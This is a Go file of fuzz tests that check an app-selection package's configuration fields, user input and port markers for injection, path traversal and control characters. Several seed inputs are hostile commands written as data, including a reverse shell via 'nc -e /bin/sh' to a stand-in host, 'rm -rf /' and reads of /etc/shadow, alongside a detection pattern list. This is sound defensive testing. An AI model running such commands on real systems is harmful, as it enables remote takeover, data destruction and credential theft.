package apps

import (
	"bytes"
	"io"
	"os"
	"strings"
	"testing"
)

// FuzzAppConfigSecurity tests App configuration for security vulnerabilities
func FuzzAppConfigSecurity(f *testing.F) {
	// Seed with various app configuration scenarios including security issues
	f.Add("1", "Static website", "base.conf", "80,443")
	f.Add("", "", "", "")
	f.Add("'; DROP TABLE apps;--", "Malicious App", "../../etc/passwd", "22;rm -rf /")
	f.Add("${SHELL}", "$(whoami)", "`cat /etc/shadow`", "80,443,$(nc -e /bin/sh evil.com 4444)")
	f.Add("1\n2\n3", "App\nWith\nNewlines", "config\ttab.conf", "80\r\n443")
	f.Add(strings.Repeat("A", 10000), strings.Repeat("B", 10000), strings.Repeat("C", 10000), strings.Repeat("D", 10000))
	f.Add("../../../", "../../../../etc/passwd", "/etc/shadow", "../../.ssh/authorized_keys")
	f.Add("\x00null", "app\x00", "file\x00.conf", "80\x00")
	f.Add("1;ls -la", "App;id", "conf;pwd", "80;netstat -an")
	f.Add("1|cat /etc/passwd", "App&&id", "conf||whoami", "80&ifconfig")

	f.Fuzz(func(t *testing.T, option, name, confFile, markers string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("App creation panicked with option=%q name=%q: %v", option, name, r)
			}
		}()

		// Create app with fuzzed values
		app := App{
			Option:   option,
			Name:     name,
			ConfFile: confFile,
			Markers:  strings.Split(markers, ","),
		}

		// Security checks
		allFields := option + name + confFile + markers

		// Check for command injection patterns
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "cat /etc/", "nc -e", "bash -c",
			"eval", "exec", "system(", "popen(",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(allFields, pattern) {
				t.Logf("Potential command injection pattern '%s' detected", pattern)
			}
		}

		// Check for path traversal
		if strings.Contains(confFile, "..") {
			t.Logf("Path traversal attempt in config file: %q", confFile)
		}

		// Check for control characters
		controlChars := []string{"\x00", "\n", "\r", "\t", "\x1b"}
		for _, char := range controlChars {
			if strings.Contains(allFields, char) {
				t.Logf("Control character detected in app configuration")
			}
		}

		// Check for SQL injection patterns
		sqlPatterns := []string{
			"'; DROP", "' OR '1'='1", "' UNION SELECT",
			"'; DELETE", "' OR 1=1--", "'; UPDATE",
		}
		for _, pattern := range sqlPatterns {
			if strings.Contains(allFields, pattern) {
				t.Logf("SQL injection pattern detected: %q", pattern)
			}
		}

		// Validate option format (should be numeric)
		if option != "" {
			isNumeric := true
			for _, char := range option {
				if char < '0' || char > '9' {
					isNumeric = false
					break
				}
			}
			if !isNumeric {
				t.Logf("Non-numeric option value: %q", option)
			}
		}

		// Check for extremely long inputs (DoS)
		if len(name) > 1000 || len(confFile) > 1000 {
			t.Logf("Extremely long input detected (potential DoS)")
		}

		// Validate config file extension
		if confFile != "" && !strings.HasSuffix(confFile, ".conf") {
			t.Logf("Suspicious config file extension: %q", confFile)
		}

		// Check markers for port injection
		for _, marker := range app.Markers {
			if marker == "" {
				continue
			}
			// Check if marker looks like a port number
			isPort := true
			for _, char := range marker {
				if char < '0' || char > '9' {
					isPort = false
					break
				}
			}
			if !isPort && !strings.Contains(marker, ":") {
				t.Logf("Invalid marker format (not a port): %q", marker)
			}
		}

		// Test GetAppByOption with fuzzed option
		foundApp, found := GetAppByOption(option)
		if found && foundApp.Option != option {
			t.Errorf("GetAppByOption returned wrong app for option %q", option)
		}
	})
}

// FuzzGetSupportedAppNamesSecurity tests app name processing for security
func FuzzGetSupportedAppNamesSecurity(f *testing.F) {
	// Seed with various app names
	f.Add("Normal App", "normal")
	f.Add("", "")
	f.Add("App;rm -rf /", "injection")
	f.Add("App\nNewline", "multiline")
	f.Add("App\x00Null", "nullbyte")
	f.Add(strings.Repeat("A", 10000), "dos")
	f.Add("${APP_NAME}", "variable")
	f.Add("App`whoami`", "backtick")

	f.Fuzz(func(t *testing.T, appName, expected string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("GetSupportedAppNames panicked with app name %q: %v", appName, r)
			}
		}()

		// Create a temporary Apps slice with fuzzed name
		originalApps := Apps
		Apps = []App{
			{Option: "1", Name: appName, ConfFile: "test.conf", Markers: []string{"80"}},
		}
		defer func() { Apps = originalApps }()

		// Get supported names
		names := GetSupportedAppNames()

		// Security checks on the output
		if len(names) > 0 {
			processedName := names[0]

			// Check if dangerous patterns survived processing
			if strings.Contains(processedName, ";") || strings.Contains(processedName, "|") {
				t.Logf("Command injection characters survived in processed name: %q", processedName)
			}

			if strings.Contains(processedName, "\n") || strings.Contains(processedName, "\r") {
				t.Logf("Newline characters survived in processed name")
			}

			if strings.Contains(processedName, "\x00") {
				t.Logf("Null byte survived in processed name")
			}

			// Verify lowercase conversion
			if processedName != strings.ToLower(appName) {
				t.Logf("Name processing modified beyond lowercase: %q -> %q", appName, processedName)
			}
		}
	})
}

// FuzzUserSelectionSecurity tests user input handling for security
func FuzzUserSelectionSecurity(f *testing.F) {
	// Seed with various user inputs
	f.Add("1,2,3", "1")
	f.Add("all", "")
	f.Add("", "")
	f.Add("1;rm -rf /", "1")
	f.Add("1,2,3,4,5,6,7,8,9,10,11,12,13", "all")
	f.Add("${MALICIOUS}", "1")
	f.Add("1\n2\n3", "1")
	f.Add("'; DROP TABLE;--", "1")
	f.Add("1,1,1,1,1", "1")
	f.Add("all;id", "1")
	f.Add("0", "1")
	f.Add("-1", "1")
	f.Add("999999", "1")
	f.Add(strings.Repeat("1,", 1000), "1")

	f.Fuzz(func(t *testing.T, userInput, defaultSelection string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("GetUserSelection panicked with input=%q: %v", userInput, r)
			}
		}()

		// Mock stdin with fuzzed input
		oldStdin := os.Stdin
		r, w, _ := os.Pipe()
		os.Stdin = r
		defer func() { 
			os.Stdin = oldStdin
			_ = r.Close()
		}()

		// Write user input
		go func() {
			defer func() { _ = w.Close() }()
			io.WriteString(w, userInput+"\n")
			// Write a valid selection to avoid infinite loop
			io.WriteString(w, "1\n")
		}()

		// Call GetUserSelection
		selectedApps, selection := GetUserSelection(defaultSelection)

		// Security validation
		if strings.Contains(selection, ";") || strings.Contains(selection, "|") {
			t.Logf("Command injection characters in selection: %q", selection)
		}

		// Check for duplicate selections
		if len(strings.Split(selection, ",")) != len(selectedApps) && selection != "all" {
			t.Logf("Duplicate selections detected")
		}

		// Validate selected apps
		for name, app := range selectedApps {
			if name != strings.ToLower(app.Name) {
				t.Errorf("App name mismatch: %q != %q", name, strings.ToLower(app.Name))
			}
		}

		// Check for out-of-range options
		if selection != "all" {
			parts := strings.Split(selection, ",")
			for _, part := range parts {
				part = strings.TrimSpace(part)
				if part == "" {
					continue
				}
				found := false
				for _, app := range Apps {
					if app.Option == part {
						found = true
						break
					}
				}
				if !found && part != "" {
					t.Logf("Invalid option accepted: %q", part)
				}
			}
		}
	})
}

// FuzzDisplayOptionsSecurity tests display output for injection vulnerabilities
func FuzzDisplayOptionsSecurity(f *testing.F) {
	// Seed with various display scenarios
	f.Add("1", "Normal App", "app.conf")
	f.Add("", "", "")
	f.Add("2", "App\x1b[31mRED\x1b[0m", "config.conf")
	f.Add("3", "App\nNewline", "file\n.conf")
	f.Add("4", "App\rCarriage", "file\r.conf")
	f.Add("5", strings.Repeat("A", 10000), "long.conf")

	f.Fuzz(func(t *testing.T, option, name, confFile string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("DisplayOptions panicked: %v", r)
			}
		}()

		// Temporarily replace Apps with fuzzed data
		originalApps := Apps
		Apps = []App{
			{Option: option, Name: name, ConfFile: confFile, Markers: []string{"80"}},
		}
		defer func() { Apps = originalApps }()

		// Capture output
		oldStdout := os.Stdout
		r, w, _ := os.Pipe()
		os.Stdout = w
		
		DisplayOptions()
		
		_ = w.Close()
		os.Stdout = oldStdout
		
		var buf bytes.Buffer
		io.Copy(&buf, r)
		output := buf.String()

		// Security checks on output
		if strings.Contains(output, "\x1b[") {
			t.Logf("ANSI escape sequences in output (potential terminal injection)")
		}

		if strings.Count(output, "\n") > 100 {
			t.Logf("Excessive newlines in output (potential DoS)")
		}

		// Check if control characters are properly handled
		controlChars := []string{"\x00", "\x07", "\x08", "\x0c"}
		for _, char := range controlChars {
			if strings.Contains(output, char) {
				t.Logf("Control character in output")
			}
		}
	})
}

// FuzzAppMarkersSecur} tests marker handling for security issues
func FuzzAppMarkersSecurity(f *testing.F) {
	// Seed with various marker scenarios
	f.Add("80,443", "80", "443")
	f.Add("", "", "")
	f.Add("80;nc -e /bin/sh evil.com 4444", "80", "443")
	f.Add("80,443,$(whoami)", "8080", "8443")
	f.Add("80\n443", "80", "443")
	f.Add("80,443,999999", "80", "443")
	f.Add(strings.Repeat("80,", 1000), "80", "443")
	f.Add("80,443,/etc/passwd", "80", "443")
	f.Add("-1,0,65536", "80", "443")

	f.Fuzz(func(t *testing.T, markers, defaultPort1, defaultPort2 string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Marker handling panicked with markers=%q: %v", markers, r)
			}
		}()

		// Parse markers
		markerList := strings.Split(markers, ",")

		// Security validation
		for _, marker := range markerList {
			marker = strings.TrimSpace(marker)
			if marker == "" {
				continue
			}

			// Check for command injection
			if strings.ContainsAny(marker, ";|&`$(){}[]<>") {
				t.Logf("Command injection characters in marker: %q", marker)
			}

			// Validate port format
			if !strings.Contains(marker, ":") {
				// Should be a port number
				isValidPort := true
				for _, char := range marker {
					if char < '0' || char > '9' {
						isValidPort = false
						break
					}
				}
				
				if isValidPort && marker != "" {
					// Check port range
					portNum := 0
					for _, char := range marker {
						portNum = portNum*10 + int(char-'0')
					}
					if portNum < 0 || portNum > 65535 {
						t.Logf("Port out of valid range: %d", portNum)
					}
				} else {
					t.Logf("Invalid port format: %q", marker)
				}
			}

			// Check for path traversal attempts
			if strings.Contains(marker, "/") || strings.Contains(marker, "\\") {
				t.Logf("Path characters in port marker: %q", marker)
			}
		}

		// Check for excessive markers (DoS)
		if len(markerList) > 100 {
			t.Logf("Excessive number of markers: %d", len(markerList))
		}
	})
}